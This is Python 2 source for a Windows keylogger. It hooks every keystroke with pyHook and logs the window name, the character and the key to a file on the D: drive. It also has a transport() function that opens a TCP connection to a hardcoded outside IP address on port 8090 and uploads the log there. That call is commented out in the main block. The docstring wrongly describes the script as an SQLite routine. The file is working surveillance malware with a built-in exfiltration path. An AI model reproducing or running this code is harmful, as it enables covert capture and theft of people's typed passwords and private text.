# -*- coding: utf-8 -*- 
import pythoncom  
import pyHook  
import time  
import os
import socket
import struct
  
  
def onMouseEvent(event):  
    #"处理鼠标事件"  
    fobj.writelines('-' * 20 + 'MouseEvent Begin' + '-' * 20 + '\n')  
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))  
    fobj.writelines("MessageName:%s\n" % str(event.MessageName))  
    fobj.writelines("Message:%d\n" % event.Message)  
    fobj.writelines("Time_sec:%d\n" % event.Time)  
    fobj.writelines("Window:%s\n" % str(event.Window))  
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))  
    fobj.writelines("Position:%s\n" % str(event.Position))  
    fobj.writelines('-' * 20 + 'MouseEvent End' + '-' * 20 + '\n')  
    return True  
  
  
def onKeyboardEvent(event):   
    #"处理键盘事件"     
    fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20 + '\n')  
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.localtime()))  #the time is right now
    #fobj.writelines("MessageName:%s\n" % str(event.MessageName))  
    #fobj.writelines("Message:%d\n" % event.Message)  
    #fobj.writelines("Time:%d\n" % event.Time)  
    #fobj.writelines("Window:%s\n" % str(event.Window))  
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))  
    fobj.writelines("Ascii_code: %d\n" % event.Ascii)  
    fobj.writelines("Ascii_char:%s\n" % chr(event.Ascii))  
    fobj.writelines("Key:%s\n" % str(event.Key))  
    fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n')  
    fobj.flush()
    return True  
  
def transport():
	host='101.200.61.191'
	port=8090
	client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #创建tcp
	client.connect((host,port))
	while 1:
		filepath='D:\\record\\hook_log.txt'
		if(os.path.isfile(filepath)):
			fileinfo_size=struct.calcsize('=12sl')
			fhead=struct.pack('=12sl',os.path.basename(filepath),os.path.getsize(filepath))
			print os.path.getsize(filepath)
			client.sendall(fhead)
			f=open(filepath,'rb')
			while 1:
				filedata=f.read(1024)
				if(not filedata):
					break;
				client.sendall(filedata)
			f.close()
			break
	client.close()
  
  
if __name__ == "__main__":   
    ''''' 
    Function:操作SQLITE3数据库函数 
    Input：NONE 
    Output: NONE 
    author: socrates 
    blog:http://blog.csdn.net/dyx1024 
    date:2012-03-1 
    '''    
          
		  
    #transport()
    #打开日志文件 
    file_name = "D:\\record\\"
    if(not os.path.exists(file_name)):
       os.makedirs(file_name)
    fobj = open(file_name+'hook_log.txt',  'w')         
  
  
    #创建hook句柄  
    hm = pyHook.HookManager()  
  
  
    #监控键盘  
    hm.KeyDown = onKeyboardEvent  
    hm.HookKeyboard()  
  
  
    #监控鼠标  
    #hm.MouseAll = onMouseEvent  
    #hm.HookMouse()  

    #循环获取消息  
    pythoncom.PumpMessages()
    

      
    #关闭日志文件  
    fobj.close()  